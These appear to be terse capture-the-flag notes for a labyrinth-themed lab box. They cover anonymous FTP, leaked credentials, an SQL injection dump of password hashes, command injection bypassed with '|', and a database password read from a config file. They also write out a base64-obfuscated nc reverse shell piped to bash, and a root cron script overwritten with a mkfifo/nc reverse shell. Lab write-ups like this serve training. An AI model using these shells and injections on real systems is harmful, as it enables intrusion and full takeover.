start with nmap

21	
80
443

ftp :port 21

anonymous login success.

get flag.txt keep_in_mind.txt message.txt

keep_in_mind.txt

```
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur

```

message.txt

```
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur


```

username found : 

minotaur
daedalus

***

enumration of webpages

login.js


daedalus : g2e55kh4ck5r

***

login into daedalus

```
 <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->

```

***

slq injectin found.

```
Database: labyrinth
Table: creatures
[4 entries]
+------------+--------------+----------------------------------+--------------------+
| idCreature | nameCreature | passwordCreature                 | permissionCreature |
+------------+--------------+----------------------------------+--------------------+
| 1          | Cerberos     | 3898e56bf6fa6ddfc3c0977c514a65a8 | user               |
| 2          | Pegasus      | 5d20441c392b68c61592b2159990abfe | user               |
| 3          | Chiron       | f847149233ae29ec0e1fcf052930c044 | user               |
| 4          | Centaurus    | ea5540126c33fe653bf56e7a686b1770 | user               |
+------------+--------------+----------------------------------+--------------------+


```


```
Database: labyrinth
Table: people
[5 entries]
+----------+--------------+----------------------------------+------------------+
| idPeople | namePeople   | passwordPeople                   | permissionPeople |
+----------+--------------+----------------------------------+------------------+
| 1        | Eurycliedes  | 42354020b68c7ed28dcdeabd5a2baf8e | user             |
| 2        | Menekrates   | 0b3bebe266a81fbfaa79db1604c4e67f | user             |
| 3        | Philostratos | b83f966a6f5a9cff9c6e1c52b0aa635b | user             |
| 4        | Daedalus     | b8e4c23686a3a12476ad7779e35f5eb6 | user             |
| 5        | M!n0taur     | 1765db9457f496a39859209ee81fbda4 | admin            |
+----------+--------------+----------------------------------+------------------+


```

M!n0taur : aminotauro

log in

?search= has cmd execution

bypass with `|`

***

shell.

```bash
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xMzMuMyAxMjM0ID4vdG1wL2Yg | base64 -d | bash

```

***
get into machine.

users with shell.

anonftp
minotaur
root

***

got password from
/var/www/html/dbConnect.php

```
$servername = "localhost";
$db = "labyrinth";
$usr = "root";
$pwd = "";
//$pwd = "bQXHS5KnfGAHaa383nFjT42AUMyWb";


```


crontab as root

/timers/timer.sh


echo "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.133.3 1337 >/tmp/f" > /timers/timer.sh